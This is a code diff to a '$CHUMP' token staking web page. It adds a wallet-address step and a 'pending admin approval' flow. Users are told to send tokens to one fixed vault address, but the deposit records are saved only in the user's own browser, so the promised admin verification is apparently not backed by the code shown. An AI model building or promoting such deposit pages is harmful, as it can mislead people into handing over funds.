@@ -813,25 +813,42 @@ footer{background:var(--dark);padding:60px 24px 40px;text-align:center;border-to
 <div class="stake-modal-overlay" id="stakeModalOverlay" onclick="overlayClose(event,'stakeModalOverlay')">
   <div class="stake-modal">
     <button class="modal-close" onclick="closeModal('stakeModalOverlay')">✕</button>
-    <div class="modal-badge" id="modalBadge">Staking Order · Confirmed</div>
-    <div class="modal-title" id="modalTitle">DEPOSIT<br>INSTRUCTIONS</div>
-    <div class="modal-sub" id="modalSub">Send your tokens to the vault below</div>
-    <hr class="modal-hr"/>
-    <div class="modal-amount-display" id="modalAmountDisplay">0</div>
-    <div class="modal-amount-label" id="modalAmountLabel">$CHUMP Tokens to Stake</div>
-    <div class="modal-wallet-lbl">Official Staking Vault Address</div>
-    <div class="modal-wallet-box">
-      <div class="modal-wallet-addr">0x960172ab0A5a6F6550E6A90200B5c19460592628</div>
-      <button class="modal-copy-btn" onclick="copyVault(this)">COPY</button>
+
+    <!-- STEP 1: Connect wallet -->
+    <div id="stkStep1">
+      <div class="modal-badge">Connect Wallet</div>
+      <div class="modal-title">ENTER YOUR<br>ADDRESS</div>
+      <div class="modal-sub">So we can credit your staked balance</div>
+      <hr class="modal-hr"/>
+      <div style="margin-bottom:10px;">
+        <label style="font-size:0.62rem;letter-spacing:3px;color:var(--gold);display:block;margin-bottom:8px;text-transform:uppercase;">Your Wallet Address</label>
+        <input id="stkWalletAddr" class="stake-input" style="width:100%;font-size:0.65rem;" placeholder="0x… your wallet address"/>
+      </div>
+      <button class="modal-confirm-btn" onclick="stkStep1Next()">CONTINUE →</button>
     </div>
-    <div class="modal-instructions">
-      <strong>1.</strong> Open your wallet (MetaMask or compatible).<br>
-      <strong>2.</strong> Send exactly <strong id="modalAmountInstr">the amount above</strong> $CHUMP to the vault address.<br>
-      <strong>3.</strong> Use the Robinhood Chain network.<br>
-      <strong>4.</strong> Your staked balance will be updated once the transaction confirms.
+
+    <!-- STEP 2: Deposit instructions -->
+    <div id="stkStep2" style="display:none;">
+      <div class="modal-badge" id="modalBadge">Staking Order · Confirmed</div>
+      <div class="modal-title" id="modalTitle">DEPOSIT<br>INSTRUCTIONS</div>
+      <div class="modal-sub" id="modalSub">Send your tokens to the vault below</div>
+      <hr class="modal-hr"/>
+      <div class="modal-amount-display" id="modalAmountDisplay">0</div>
+      <div class="modal-amount-label" id="modalAmountLabel">$CHUMP Tokens to Stake</div>
+      <div class="modal-wallet-lbl">Official Staking Vault Address</div>
+      <div class="modal-wallet-box">
+        <div class="modal-wallet-addr">0x960172ab0A5a6F6550E6A90200B5c19460592628</div>
+        <button class="modal-copy-btn" onclick="copyVault(this)">COPY</button>
+      </div>
+      <div class="modal-instructions">
+        <strong>1.</strong> Open your wallet (MetaMask or compatible).<br>
+        <strong>2.</strong> Send exactly <strong id="modalAmountInstr">the amount above</strong> $CHUMP to the vault address.<br>
+        <strong>3.</strong> Use the Robinhood Chain network.<br>
+        <strong>4.</strong> Click confirm below once you've sent — admin will verify and credit your balance.
+      </div>
+      <button class="modal-confirm-btn" onclick="confirmStake()">✓ I'VE SENT THE TOKENS</button>
+      <div class="modal-warning">⚠ Only send $CHUMP tokens on Robinhood Chain to this address.<br>Sending wrong tokens or using wrong network may result in permanent loss.</div>
     </div>
-    <button class="modal-confirm-btn" onclick="confirmStake()">✓ I'VE SENT THE TOKENS</button>
-    <div class="modal-warning">⚠ Only send $CHUMP tokens on Robinhood Chain to this address.<br>Sending wrong tokens or using wrong network may result in permanent loss.</div>
   </div>
 </div>
 
@@ -902,13 +919,29 @@ function setMax(){
 function openStakeModal(){
   const amt = parseFloat(document.getElementById('stakeAmount').value);
   if(!amt || amt <= 0){ alert('Please enter the amount of $CHUMP you want to stake.'); return; }
+  // Reset to step 1
+  document.getElementById('stkStep1').style.display = '';
+  document.getElementById('stkStep2').style.display = 'none';
+  document.getElementById('stkWalletAddr').value = localStorage.getItem('chumpConnectedAddr') || '';
+  // Pre-fill step 2 data
   document.getElementById('modalAmountDisplay').textContent = amt.toLocaleString();
   document.getElementById('modalAmountInstr').textContent = amt.toLocaleString();
-  document.getElementById('modalBadge').textContent = 'Staking Order · Confirmed';
+  document.getElementById('modalBadge').textContent = 'Staking Order · Pending';
   document.getElementById('modalTitle').innerHTML = 'DEPOSIT<br>INSTRUCTIONS';
   document.getElementById('modalSub').textContent = 'Send your tokens to the vault below';
   document.getElementById('modalAmountLabel').textContent = '$CHUMP Tokens to Stake';
   document.getElementById('stakeModalOverlay').classList.add('open');
+}
+
+function stkStep1Next(){
+  const addr = document.getElementById('stkWalletAddr').value.trim();
+  if(!addr || !addr.startsWith('0x') || addr.length < 10){
+    alert('Please enter a valid wallet address (starting with 0x).');
+    return;
+  }
+  localStorage.setItem('chumpConnectedAddr', addr.toLowerCase());
+  document.getElementById('stkStep1').style.display = 'none';
+  document.getElementById('stkStep2').style.display = '';
 }
 
 function openBuyModal(){
@@ -956,24 +989,37 @@ function overlayClose(e, id){
 
 function confirmStake(){
   const amt = parseFloat(document.getElementById('stakeAmount').value) || 0;
-  stakedBalance += amt;
-  localStorage.setItem('chumpStaked', stakedBalance);
-  // Also store per-address if an address was entered
-  const lastAddr = localStorage.getItem('chumpConnectedAddr');
-  if(lastAddr){
-    const key = 'chumpStaked_' + lastAddr.toLowerCase();
-    const prev = parseFloat(localStorage.getItem(key) || '0');
-    localStorage.setItem(key, prev + amt);
-  }
+  const addr = (localStorage.getItem('chumpConnectedAddr') || '').toLowerCase();
+
+  // Save a pending deposit record for admin to review
+  const STORE_KEY = 'chump_deposits';
+  let deposits = [];
+  try { deposits = JSON.parse(localStorage.getItem(STORE_KEY) || '[]'); } catch(e){}
+  const depId = 'DEP-' + Date.now();
+  deposits.push({
+    id: depId,
+    name: '',
+    wallet: addr,
+    eth: 0,
+    txhash: '0x' + '0'.repeat(64), // placeholder — user hasn't provided tx hash yet
+    status: 'pending',
+    chumpBalance: amt,
+    submittedAt: new Date().toISOString(),
+    note: 'Staking request — ' + amt.toLocaleString() + ' $CHUMP'
+  });
+  localStorage.setItem(STORE_KEY, JSON.stringify(deposits));
+
+  // Show pending notification to admin badge
   updateBalDisplay();
   closeModal('stakeModalOverlay');
   document.getElementById('stakeAmount').value = '';
+
   // Show success flash
   const btn = document.querySelector('.stake-btn-main');
   const orig = btn.textContent;
-  btn.textContent = '✓ STAKED — BALANCE UPDATED';
-  btn.style.background = '#2d7a2d';
-  setTimeout(()=>{ btn.textContent = orig; btn.style.background = ''; }, 3500);
+  btn.textContent = '✓ REQUEST SUBMITTED — PENDING ADMIN APPROVAL';
+  btn.style.background = '#1a5c2d';
+  setTimeout(()=>{ btn.textContent = orig; btn.style.background = ''; }, 4000);
 }
 
 function copyVault(btn){
